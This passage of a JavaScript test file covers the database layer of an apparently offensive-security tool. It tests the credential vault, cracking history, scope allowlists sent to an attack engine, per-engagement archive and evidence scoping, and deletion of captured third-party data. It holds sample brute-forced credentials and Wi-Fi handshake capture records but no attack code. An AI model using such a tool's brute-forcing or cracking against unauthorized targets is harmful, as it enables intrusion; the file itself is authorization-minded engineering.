     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);

  const status = await getVaultStatus();
  assert.equal(status.unprotectedCredentials, 1);
  assert.equal(status.unprotectedCrackedPasswords, 1);
  assert.equal(status.unprotected, 2, 'the banner has to describe the database, not one table');
});

test('sealing the vault seals both tables in one action', async () => {
  // An operator clicking "seal the vault" is not choosing to protect one table.
  await ensureVault();
  raw().raw.exec(`INSERT INTO credentials
    (target_ip, port, service, username, password, enc_version)
    VALUES ('10.0.0.5', 22, 'ssh', 'root', 'cleartext1', 0)`);
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);

  const sealed = await sealLegacyCredentials();
  assert.equal(sealed, 2, 'one credential and one cracked passphrase');
  const status = await getVaultStatus();
  assert.equal(status.unprotected, 0);
});

test('history comes back newest first and deleting removes only that run', async () => {
  await ensureVault();
  await saveCrackingRecord(crackRun({ pcap_file: 'a.pcap', cracked_password: null, result: 'FAILED' }));
  await saveCrackingRecord(crackRun({ pcap_file: 'b.pcap', cracked_password: null, result: 'FAILED' }));
  const before = await getCrackingHistory();
  assert.equal(before.length, 2);
  await deleteCrackingRecord(before[0].id);
  const after = await getCrackingHistory();
  assert.equal(after.length, 1);
  assert.notEqual(after[0].id, before[0].id);
});

test('a simulated run is flagged so it cannot be read as real hashcat output', async () => {
  await ensureVault();
  await saveCrackingRecord(crackRun({ cracked_password: null, result: 'ABORTED', is_simulated: 1 }));
  const [record] = await getCrackingHistory();
  assert.equal(record.is_simulated, 1);
});

// ── Pushing the scope to the engine ─────────────────────────────────────────
//
// The engine keeps its own copy of the allowlist and refuses offensive commands
// against anything outside it. Two properties of this handoff decide whether
// that gate means anything, and both are about what happens when things go
// wrong rather than when they go right.

/** Replace `engineIPC.send` for one call and record what was sent. */
async function withSendStub(impl, fn) {
  const original = engineIPC.send;
  const sent = [];
  engineIPC.send = async (cmd, payload) => {
    sent.push({ cmd, payload });
    return impl ? impl(cmd, payload) : undefined;
  };
  try {
    return { result: await fn(), sent };
  } finally {
    engineIPC.send = original;
  }
}

test('with no active scope the engine is sent a cleared allowlist, not nothing', async () => {
  /*
    Skipping the send would leave whatever the engine already had in force —
    which, after switching engagements, is the previous client's allowlist. An
    empty allowlist denies everything, so sending it is the fail-closed move and
    saying nothing is not.
  */
  await createScope(scopeInput());   // exists but never activated
  const { result, sent } = await withSendStub(null, () => pushScopeToEngine('nat'));
  assert.equal(sent.length, 1);
  assert.equal(sent[0].cmd, 'set_scope');
  assert.equal(sent[0].payload.scope_id, null);
  assert.equal(sent[0].payload.mode, 'ALLOWLIST');
  assert.deepEqual(sent[0].payload.targets, []);
  // Returned so the caller can tell the operator what is now in force — the
  // AppShell uses the absent engagement_name to warn that nothing is armed.
  assert.equal(result.engagement_name, null);
});

test('the active scope and its targets reach the engine verbatim', async () => {
  const id = await createScope(scopeInput({
    targets: [{ kind: 'CIDR', value: '10.0.0.0/24' }, { kind: 'BSSID', value: 'AA:BB:CC:DD:EE:FF' }],
  }));
  await activateScope(id);
  const { sent } = await withSendStub(null, () => pushScopeToEngine('nat'));
  const payload = sent[0].payload;
  assert.equal(payload.scope_id, id);
  assert.equal(payload.engagement_name, 'ACME Q3');
  assert.equal(payload.authorized_by, 'CISO');
  assert.equal(payload.operator, 'nat');
  assert.deepEqual(
    payload.targets.map(t => `${t.kind}:${t.value}`).sort(),
    ['BSSID:AA:BB:CC:DD:EE:FF', 'CIDR:10.0.0.0/24']
  );
});

test('a failed push throws rather than letting the caller assume the gate is armed', async () => {
  /*
    The second load-bearing property. If this resolved quietly, the operator
    would be told the scope was applied while the engine was running against
    something else — and every offensive command after that would be gated by an
    allowlist nobody chose. The AppShell and the Settings page both surface the
    throw.
  */
  const id = await createScope(scopeInput());
  await activateScope(id);
  await assert.rejects(
    () => withSendStub(() => { throw new Error('engine not connected'); },
                       () => pushScopeToEngine('nat')),
    /engine not connected/
  );
});

test('a scope status request asks the engine for its own view', async () => {
  // The operator needs the engine's answer, not the frontend's belief about it:
  // the whole point is to detect the two having drifted apart.
  const { sent } = await withSendStub(null, () => requestScopeStatus());
  assert.deepEqual(sent.map(s => s.cmd), ['get_scope']);
});

/*
  ── The vault snapshot that belonged to every engagement at once ─────────────

  `getCredentialsForArchive` was `SELECT ... FROM credentials ORDER BY
  discovered_at DESC` with no scope at all, and `toHostInput` in
  `report/archive.ts` attaches a credential to a host on `target_ip === host.ip`
  and nothing else.

  RFC1918 gateway addresses collide across virtually every engagement, so
  `admin/admin` recovered on 192.168.1.1 at one client reappeared weeks later as a
  finding against a different client's 192.168.1.1 -- scored 100, CRITICAL,
  CONFIRMED, over the words "A working credential was recovered ... This is
  demonstrated access, not a theoretical weakness." About a host nothing had ever
  been tried against.

  `session_id` and its index have been on this table since migration 005. The
  query simply never used them.
*/

test('an archive snapshot carries only its own session\'s credentials', async () => {
  await ensureVault();
  await saveCredential('192.168.1.1', 80, 'HTTP', 'admin', 'admin', 'bruteforce', 'SESSION-A');
  await saveCredential('192.168.1.1', 22, 'SSH', 'root', 'toor', 'bruteforce', 'SESSION-B');

  const forB = await getCredentialsForArchive('SESSION-B');
  assert.equal(forB.length, 1, 'another engagement\'s credential reached this archive');
  assert.equal(forB[0].username, 'root');
  assert.equal(forB[0].session_id, 'SESSION-B');
});

test('the same address in two engagements does not leak between them', async () => {
  await ensureVault();
  await saveCredential('10.0.0.1', 80, 'HTTP', 'admin', 'admin', 'bruteforce', 'SESSION-C');

  const forD = await getCredentialsForArchive('SESSION-D');
  assert.deepEqual(forD, [],
    'a session with no credentials of its own inherited another session\'s');
});

test('a snapshot with no session id includes nothing rather than everything', async () => {
  await ensureVault();
  await saveCredential('172.16.0.1', 80, 'HTTP', 'admin', 'admin', 'bruteforce', 'SESSION-E');

  /*
    The safe failure direction. With no session there is nothing to scope by, and
    an unscoped snapshot is the defect itself. A report that omits a credential
    understates what was found, which a reader can recover from; one that invents
    a demonstrated login against a stranger's host cannot be recovered from.
  */
  for (const missing of [null, undefined, '']) {
    assert.deepEqual(await getCredentialsForArchive(missing), [],
      `a ${JSON.stringify(missing)} session id returned rows`);
  }
});

test('the snapshot still never carries a cleartext password', async () => {
  // The property this function already had, which the scoping must not disturb:
  // the archive is written into the same database file as the vault, so it holds
  // ciphertext or it undoes the encryption entirely.
  await ensureVault();
  await saveCredential('10.1.1.1', 22, 'SSH', 'admin', 'TopSecret123!', 'bruteforce', 'SESSION-F');

  const rows = await getCredentialsForArchive('SESSION-F');
  assert.equal(rows.length, 1);
  const serialised = JSON.stringify(rows);
  assert.ok(!serialised.includes('TopSecret123!'),
    'the plaintext password appears in the archive snapshot');
  assert.ok(rows[0].password_cipher, 'the ciphertext is missing');
});

/*
  ── Two per-archive report sections that read the whole installation ─────────

  `getEvidence` took only a limit and returned every row in `evidence_files`, while
  the PDF prints the result as the EVIDENCE REGISTER, introduced as "the artifacts
  behind its findings". So exporting engagement A's archive listed B's and C's
  captures — filename, filesystem path, SSID, BSSID and SHA-256 — as evidence for A.

  `getClientsForBssid` had no mission filter, and the report states "N station(s) were
  observed ASSOCIATED with this access point" under a heading that says "during the
  survey". Re-survey the same estate for a different client and Monday's archive listed
  Wednesday's stations with Wednesday's timestamps.

  `mission_id` and its index have been on both tables since migration 009.
*/

test('the evidence register carries only the missions being exported', async () => {
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/a.pcap', filename: 'a.pcap',
                         sha256: 'aa', bssid: 'AA:BB:CC:DD:EE:01', mission_id: 'M-A' });
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/b.pcap', filename: 'b.pcap',
                         sha256: 'bb', bssid: 'AA:BB:CC:DD:EE:02', mission_id: 'M-B' });

  const forA = await getEvidence(['M-A']);
  assert.equal(forA.length, 1, "another engagement's artifact reached this register");
  assert.equal(forA[0].filename, 'a.pcap');
});

test('a multi-archive export carries every mission in it and no others', async () => {
  await recordEvidence({ kind: 'pmkid_hc22000', path: 'C:/c.hc', filename: 'c.hc',
                         sha256: 'cc', mission_id: 'M-C' });
  await recordEvidence({ kind: 'pmkid_hc22000', path: 'C:/d.hc', filename: 'd.hc',
                         sha256: 'dd', mission_id: 'M-D' });

  const names = (await getEvidence(['M-C', 'M-D'])).map(r => r.filename).sort();
  assert.deepEqual(names, ['c.hc', 'd.hc']);
});

test('an export with no mission id lists nothing rather than everything', async () => {
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/e.pcap', filename: 'e.pcap',
                         sha256: 'ee', mission_id: 'M-E' });
  // The safe direction: a register that omits an artifact understates the document,
  // and one that credits this engagement with a stranger's capture cannot be taken
  // back once it has been delivered.
  assert.deepEqual(await getEvidence([]), []);
  assert.deepEqual(await getEvidence([null, undefined, '']), []);
});

test('the verification sweep is still installation-wide, and says so in its name', async () => {
  // Re-hashing files on this machine's disk is a property of the installation, not
  // of one engagement, so this read is deliberately unscoped — under a name that
  // cannot be mistaken for the register's.
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/f.pcap', filename: 'f.pcap',
                         sha256: 'ff', mission_id: 'M-F' });
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/g.pcap', filename: 'g.pcap',
                         sha256: 'gg', mission_id: 'M-G' });
  const all = await getAllEvidenceForVerification(1000);
  const names = all.map(r => r.filename);
  assert.ok(names.includes('f.pcap') && names.includes('g.pcap'));
});

test('a station list is scoped to the survey that observed it', async () => {
  await recordClient({ mac: '11:22:33:44:55:01', associated_bssid: 'AA:BB:CC:DD:EE:10',
                       probe_count: 1 }, 'M-MON');
  await recordClient({ mac: '11:22:33:44:55:02', associated_bssid: 'AA:BB:CC:DD:EE:10',
                       probe_count: 1 }, 'M-WED');

  const monday = await getClientsForBssid('AA:BB:CC:DD:EE:10', 'M-MON');
  assert.equal(monday.length, 1, "a later survey's station appeared in this one");
  assert.equal(monday[0].mac, '11:22:33:44:55:01');
});

test('a station list with no mission id is empty, not the whole table', async () => {
  await recordClient({ mac: '11:22:33:44:55:03', associated_bssid: 'AA:BB:CC:DD:EE:11',
                       probe_count: 1 }, 'M-MON');
  // "N stations were observed during the survey" cannot be stated without knowing
  // which survey, so there is nothing honest to return.
  assert.deepEqual(await getClientsForBssid('AA:BB:CC:DD:EE:11', null), []);
});

test('the BSSID match stays case-insensitive within a mission', async () => {
  await recordClient({ mac: '11:22:33:44:55:04', associated_bssid: 'aa:bb:cc:dd:ee:12',
                       probe_count: 1 }, 'M-MON');
  const rows = await getClientsForBssid('AA:BB:CC:DD:EE:12', 'M-MON');
  assert.equal(rows.length, 1);
});

/*
  ── A reading nothing took, stored as a measurement ──────────────────────────

  The `strongest_rssi` upsert was
  `MAX(COALESCE(clients.strongest_rssi, -127), COALESCE(excluded.strongest_rssi, -127))`,
  so two unknowns became a hard -127 — a fabricated measurement, indistinguishable
  from one a radio actually took, and the same defect class as the
  `scan_logs.rssi ?? -90` write that `wardrivingDB` records against itself.

  It was reached on nearly every station: the only producer of client rows is
  `probe_monitor.py`, whose `observe_probe` call passes no rssi, while `probe_count`
  increments on every probe — so the second probe from any station took the conflict
  path.
*/

test('a station with no signal reading keeps none after a second sighting', async () => {
  await recordClient({ mac: '22:33:44:55:66:01', probe_count: 1 }, 'M-RSSI');
  await recordClient({ mac: '22:33:44:55:66:01', probe_count: 2 }, 'M-RSSI');

  const rows = await getClients(50);
  const row = rows.find(r => r.mac === '22:33:44:55:66:01');
  assert.equal(row.strongest_rssi, null,
    'two unknowns were resolved into a measurement of -127');
});

test('the stronger of two readings still wins', async () => {
  await recordClient({ mac: '22:33:44:55:66:02', probe_count: 1, strongest_rssi: -80 }, 'M-RSSI');
  await recordClient({ mac: '22:33:44:55:66:02', probe_count: 2, strongest_rssi: -52 }, 'M-RSSI');

  const row = (await getClients(50)).find(r => r.mac === '22:33:44:55:66:02');
  assert.equal(row.strongest_rssi, -52);
});

test('a weaker later reading does not replace a stronger one', async () => {
  await recordClient({ mac: '22:33:44:55:66:03', probe_count: 1, strongest_rssi: -52 }, 'M-RSSI');
  await recordClient({ mac: '22:33:44:55:66:03', probe_count: 2, strongest_rssi: -80 }, 'M-RSSI');

  const row = (await getClients(50)).find(r => r.mac === '22:33:44:55:66:03');
  assert.equal(row.strongest_rssi, -52);
});

test('a single reading survives a later sighting that has none', async () => {
  // MAX ignores NULL in SQLite, so a real measurement is not erased by a probe that
  // carried no signal — which is the behaviour the COALESCE was reaching for and got
  // wrong by inventing a floor instead.
  await recordClient({ mac: '22:33:44:55:66:04', probe_count: 1, strongest_rssi: -60 }, 'M-RSSI');
  await recordClient({ mac: '22:33:44:55:66:04', probe_count: 2 }, 'M-RSSI');

  const row = (await getClients(50)).find(r => r.mac === '22:33:44:55:66:04');
  assert.equal(row.strongest_rssi, -60);
});

test('a first reading arriving late is taken', async () => {
  await recordClient({ mac: '22:33:44:55:66:05', probe_count: 1 }, 'M-RSSI');
  await recordClient({ mac: '22:33:44:55:66:05', probe_count: 2, strongest_rssi: -58 }, 'M-RSSI');

  const row = (await getClients(50)).find(r => r.mac === '22:33:44:55:66:05');
  assert.equal(row.strongest_rssi, -58);
});

/*
  ── Deleting a survey left somebody else's data in the file ──────────────────

  `clients` and `evidence_files` carry `mission_id` / `session_id` with no foreign key,
  so nothing cascades to them, and every read filters by that column — which meant
  removing a survey from the archive hid them from the interface while leaving them on
  disk. Both hold third-party data: `clients` is the station inventory (MAC, vendor,
  probed SSIDs) collected from devices belonging to people who are not the client, and
  `evidence_files` holds the filesystem paths and SHA-256 of captured handshakes.
  `credentials` was the same for a sweep, and those are recovered passwords.

  `purgeCollectedData` always cleared them, so only per-item deletion was affected —
  which is the deletion an operator reaches for when they mean "remove this one".
*/

test('deleting a mission takes its station inventory with it', async () => {
  await createMission('M-DEL', 'Estate A');
  await recordClient({ mac: '33:44:55:66:77:01', vendor: 'Apple', probe_count: 1 }, 'M-DEL');
  await recordClient({ mac: '33:44:55:66:77:02', vendor: 'Dell', probe_count: 1 }, 'M-KEEP');

  await deleteMission('M-DEL');

  const macs = (await getClients(100)).map(c => c.mac);
  assert.ok(!macs.includes('33:44:55:66:77:01'), 'the deleted mission left a station behind');
  assert.ok(macs.includes('33:44:55:66:77:02'), 'another mission lost a station');
});

test('deleting a mission takes its evidence register rows with it', async () => {
  await createMission('M-DEL2', 'Estate B');
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/del.pcap', filename: 'del.pcap',
                         sha256: 'dd1', mission_id: 'M-DEL2' });
  await recordEvidence({ kind: 'handshake_pcap', path: 'C:/keep.pcap', filename: 'keep.pcap',
                         sha256: 'kk1', mission_id: 'M-KEEP2' });

  await deleteMission('M-DEL2');

  const names = (await getAllEvidenceForVerification(500)).map(r => r.filename);
  assert.ok(!names.includes('del.pcap'), 'a capture path survived its mission');
  assert.ok(names.includes('keep.pcap'), 'another mission lost its evidence');
});

test('deleting a sweep takes its recovered credentials with it', async () => {
  await ensureVault();
  await createSession('S-DEL', '10.9.0.0/24', 'QUICK', 'eth0');
  await saveCredential('10.9.0.1', 22, 'SSH', 'root', 'hunter2', 'bruteforce', 'S-DEL');
  await saveCredential('10.9.0.2', 22, 'SSH', 'root', 'hunter3', 'bruteforce', 'S-KEEP');

  await deleteSession('S-DEL');

  const left = await getCredentialsForArchive('S-DEL');
  assert.deepEqual(left, [], 'a deleted sweep kept its credentials');
  assert.equal((await getCredentialsForArchive('S-KEEP')).length, 1,
    'another sweep lost its credentials');
});

test('deleting a sweep takes its evidence register rows with it', async () => {
  await createSession('S-DEL2', '10.9.1.0/24', 'QUICK', 'eth0');
  await recordEvidence({ kind: 'pmkid_hc22000', path: 'C:/s-del.hc', filename: 's-del.hc',
                         sha256: 'sd1', session_id: 'S-DEL2' });

  await deleteSession('S-DEL2');

  const names = (await getAllEvidenceForVerification(500)).map(r => r.filename);
  assert.ok(!names.includes('s-del.hc'), 'a capture path survived its sweep');
});

test('a wardriving mission keeps its findings when a sweep is deleted', async () => {
  // The existing guarantee, re-asserted because the new deletes are in the same
  // function: `findings` is shared between missions and sweeps, and clearing by the
  // wrong key would take a survey's findings with a sweep.
  await createMission('M-SHARED', 'Estate C');
  await upsertFindings([{
    subject_type: 'AP', subject_id: 'AA:BB:CC:DD:EE:F0', mission_id: 'M-SHARED',
    category: 'encryption', title: 'OPEN network', severity: 'CRITICAL', risk_score: 95,
    confidence: 'CONFIRMED', rationale: 'r', methodology: 'm', fingerprint: 'fp-shared',
    is_simulated: false,
  }]);
  await createSession('S-OTHER', '10.9.2.0/24', 'QUICK', 'eth0');
  await deleteSession('S-OTHER');

  const findings = await getFindings({ missionId: 'M-SHARED' });
  assert.equal(findings.length, 1, 'a mission lost its findings to an unrelated sweep');
});

/*
  ── One active engagement, enforced by the file ───────────────────────────────

  008 declared this invariant in a comment and left it to `activateScope`, on the stated
  grounds that "SQLite has no clean partial-unique constraint for it across all
  supported versions". Partial indexes have been in SQLite since 3.8.0 in 2013.

  It is worth enforcing because of what the row is: the active scope is the
  authorization record `policy.py` gates every offensive command against, and that the
  report's refusals section is written from. Two active at once would make "which
  authorization covered this command?" unanswerable.
*/

test('a second engagement cannot be activated while one is active', async () => {
  const a = await createScope(scopeInput({ engagement_name: 'Client A' }));
  const b = await createScope(scopeInput({ engagement_name: 'Client B' }));
  await activateScope(a);
  await assert.rejects(
    () => raw().execute('UPDATE engagement_scope SET is_active = 1 WHERE id = $1', [b]),
    'the database allowed two simultaneously active engagements',
  );
});

test('activating a scope deactivates the previous one', async () => {
  // The clear-then-set order is what satisfies the index; this pins the behaviour so a
  // future refactor that reverses it fails here rather than at an operator's desk.
  const a = await createScope(scopeInput({ engagement_name: 'Client C' }));
  const b = await createScope(scopeInput({ engagement_name: 'Client D' }));
  await activateScope(a);
  await activateScope(b);

  const active = await getActiveScope();
  assert.equal(active?.engagement_name, 'Client D');
  const count = await raw().select(
    'SELECT COUNT(*) as n FROM engagement_scope WHERE is_active = 1');
  assert.equal(count[0].n, 1);
});
